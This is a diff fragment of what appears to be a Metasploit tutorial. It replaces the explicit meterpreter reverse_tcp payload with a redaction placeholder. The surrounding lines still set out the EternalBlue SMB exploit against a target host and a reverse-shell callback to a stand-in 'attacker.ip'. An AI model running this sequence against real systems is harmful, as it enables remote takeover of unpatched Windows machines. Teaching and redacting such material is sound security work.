@@ -239,7 +239,7 @@ msf> use exploit/windows/smb/ms17_010_eternalblue
 msf> set RHOSTS target.com
 
 # Set payload
-msf> set PAYLOAD windows/meterpreter/reverse_tcp
+msf> set PAYLOAD [REDACTED_MSFVENOM_PAYLOAD]
 msf> set LHOST attacker.ip
 
 # Execute
